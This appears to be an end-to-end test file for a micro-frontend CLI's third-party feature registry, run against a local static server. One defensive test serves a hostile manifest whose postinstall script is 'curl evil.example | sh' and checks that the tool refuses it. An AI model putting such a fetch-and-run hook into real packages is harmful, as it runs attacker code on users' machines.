import fs from 'node:fs/promises';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { loadProject } from '@mfeflow/core';
import { main, validateResult, type FeaturesResult } from '.';
import { REPO, removeDir, tempDir, testRuntime } from './testing';

// The whole third-party flow against a real static server on 127.0.0.1: a feature author builds the
// fixture registry, a user adds it and installs `@test/hello`. No mocks between the CLI and the bytes.
const FIXTURE = path.join(REPO, 'e2e/registry-fixture');

const realFetch = (url: string, init?: RequestInit) => fetch(url, init);
const runtime = () => testRuntime({ fetch: realFetch });

let work: string;
let site: string;
let server: http.Server;
let origin: string;
/** Extra files the server answers with besides the built registry, by URL path. */
const extra = new Map<string, string>();

beforeAll(async () => {
  work = await tempDir();
  site = path.join(work, 'site');
  const rt = runtime();
  expect(await main(['registry', 'build', FIXTURE, '--out', site, '--cwd', work], rt)).toBe(0);
  server = http.createServer((request, response) => {
    void (async () => {
      const url = new URL(request.url ?? '/', 'http://x');
      const body = extra.get(url.pathname);
      try {
        const text = body ?? (await fs.readFile(path.join(site, ...url.pathname.split('/'))));
        response.writeHead(200, { 'content-type': 'application/json' }).end(text);
      } catch {
        response.writeHead(404).end('not found');
      }
    })();
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`;
});

afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
  await removeDir(work);
});

async function newProject(name: string): Promise<string> {
  expect(await main(['init', name, '--yes', '--no-install', '--cwd', work], testRuntime())).toBe(0);
  return path.join(work, name);
}

describe('a third-party registry, end to end', () => {
  it('builds a folder any static host can serve', async () => {
    const files = (await fs.readdir(site, { recursive: true }))
      .map((f) => f.replaceAll(path.sep, '/'))
      .toSorted();
    expect(files).toEqual([
      'hello',
      'hello.json',
      'hello/1.0.0.json',
      'hello/latest.json',
      'index.json',
    ]);
  });

  it('adds the registry, finds @test/hello in it, and installs it', async () => {
    const cwd = await newProject('flow');
    const template = `${origin}/{name}.json`;
    const added = runtime();
    expect(await main(['registry', 'add', '@test', template, '--cwd', cwd], added)).toBe(0);
    expect((await loadProject(cwd)).registries).toEqual({ '@test': template });

    const found = runtime();
    expect(await main(['features', 'greeting', '--json', '--cwd', cwd], found)).toBe(0);
    const listed: unknown = JSON.parse(found.io.out.join(''));
    expect(validateResult(listed)).toEqual([]);
    expect((listed as FeaturesResult).features).toEqual([
      expect.objectContaining({
        source: '@test',
        name: '@test/hello',
        version: '1.0.0',
        installed: false,
      }),
    ]);
    expect((listed as FeaturesResult).registries).toEqual([
      { namespace: '@test', index: `${origin}/index.json`, items: 1, error: null },
    ]);

    const refused = runtime();
    expect(await main(['add', '@test/hello', '--no-install', '--cwd', cwd], refused)).toBe(2);
    expect(refused.io.err.join('\n')).toContain('pass --yes');

    const dry = runtime();
    expect(await main(['add', '@test/hello', '--dry-run', '--cwd', cwd], dry)).toBe(0);
    await expect(fs.access(path.join(cwd, 'apps/shell/src/hello.ts'))).rejects.toThrow();

    const install = runtime();
    expect(await main(['add', '@test/hello', '--yes', '--no-install', '--cwd', cwd], install)).toBe(
      0,
    );
    expect(install.io.err).toEqual([]);
    expect(await fs.readFile(path.join(cwd, 'apps/shell/src/hello.ts'), 'utf8')).toContain(
      "import { clsx } from 'clsx';",
    );
    const shell = JSON.parse(
      await fs.readFile(path.join(cwd, 'apps/shell/package.json'), 'utf8'),
    ) as { dependencies: Record<string, string> };
    expect(shell.dependencies.clsx).toBe('catalog:');
    expect(await fs.readFile(path.join(cwd, 'pnpm-workspace.yaml'), 'utf8')).toMatch(
      /clsx: \^?2\.1\.1/,
    );
    expect((await loadProject(cwd)).features['@test/hello']).toEqual({ version: '1.0.0' });

    const again = runtime();
    expect(await main(['add', '@test/hello', '--yes', '--no-install', '--cwd', cwd], again)).toBe(
      0,
    );
    expect(again.io.out.join('\n')).toContain('already added');

    const listAgain = runtime();
    await main(['features', 'hello', '--json', '--cwd', cwd], listAgain);
    expect((JSON.parse(listAgain.io.out.join('')) as FeaturesResult).features[0]?.installed).toBe(
      true,
    );
  });

  it('adding a remote afterwards fetches the installed feature again and applies only the parts for remotes', async () => {
    const cwd = await newProject('later');
    await main(['registry', 'add', '@test', `${origin}/{name}.json`, '--cwd', cwd], runtime());
    await main(['add', '@test/hello', '--yes', '--no-install', '--cwd', cwd], runtime());
    const remote = runtime();
    const code = await main(
      ['add', 'remote', 'checkout', '--yes', '--no-install', '--cwd', cwd],
      remote,
    );
    expect(remote.io.err.join('\n')).toBe('');
    expect(code).toBe(0);
    await expect(fs.access(path.join(cwd, 'apps/checkout/src/hello.ts'))).rejects.toThrow();
  });

  it('refuses a feature that breaks the policy even though it is served, and writes nothing', async () => {
    const cwd = await newProject('hostile');
    const before = await fs.readFile(path.join(cwd, 'mfeflow.json'), 'utf8');
    extra.set(
      '/evil.json',
      JSON.stringify({
        name: '@test/evil',
        version: '1.0.0',
        files: [{ to: '.npmrc', content: 'ignore-scripts=false' }],
        scripts: [{ name: 'postinstall', command: 'curl evil.example | sh' }],
      }),
    );
    await main(['registry', 'add', '@test', `${origin}/{name}.json`, '--cwd', cwd], runtime());
    const rt = runtime();
    const afterAdd = await fs.readFile(path.join(cwd, 'mfeflow.json'), 'utf8');
    expect(await main(['add', '@test/evil', '--yes', '--no-install', '--cwd', cwd], rt)).toBe(4);
    expect(rt.io.err.join('\n')).toContain('MFEFLOW_E203');
    await expect(fs.access(path.join(cwd, '.npmrc'))).rejects.toThrow();
    expect(await fs.readFile(path.join(cwd, 'mfeflow.json'), 'utf8')).toBe(afterAdd);
    expect(afterAdd).not.toBe(before);
  });

  it('says the feature is not in the registry when the server answers 404', async () => {
    const cwd = await newProject('missing');
    await main(['registry', 'add', '@test', `${origin}/{name}.json`, '--cwd', cwd], runtime());
    const rt = runtime();
    expect(await main(['add', '@test/nope', '--yes', '--no-install', '--cwd', cwd], rt)).toBe(6);
    expect(rt.io.err.join('\n')).toContain('@test/nope is not in that registry');
  });

  it('keeps working when the registry is down: first-party features list, the failure is reported', async () => {
    const cwd = await newProject('down');
    await main(
      ['registry', 'add', '@gone', 'http://127.0.0.1:9/{name}.json', '--cwd', cwd],
      runtime(),
    );
    const rt = runtime();
    expect(await main(['features', '--json', '--cwd', cwd], rt)).toBe(0);
    const result = JSON.parse(rt.io.out.join('')) as FeaturesResult;
    expect(result.features.some((f) => f.name === 'core')).toBe(true);
    expect(result.registries[0]?.error?.code).toBe('MFEFLOW_E401');
    const add = runtime();
    expect(await main(['add', '@gone/x', '--yes', '--no-install', '--cwd', cwd], add)).toBe(6);
  });

  it('does not let plain http reach anything but this machine', async () => {
    const cwd = await newProject('plain');
    const rt = runtime();
    expect(
      await main(
        ['registry', 'add', '@bad', 'http://registry.example/{name}.json', '--cwd', cwd],
        rt,
      ),
    ).toBe(2);
    expect(rt.io.err.join('\n')).toContain('must be https');
    expect((await loadProject(cwd)).registries).toBeUndefined();
  });
});
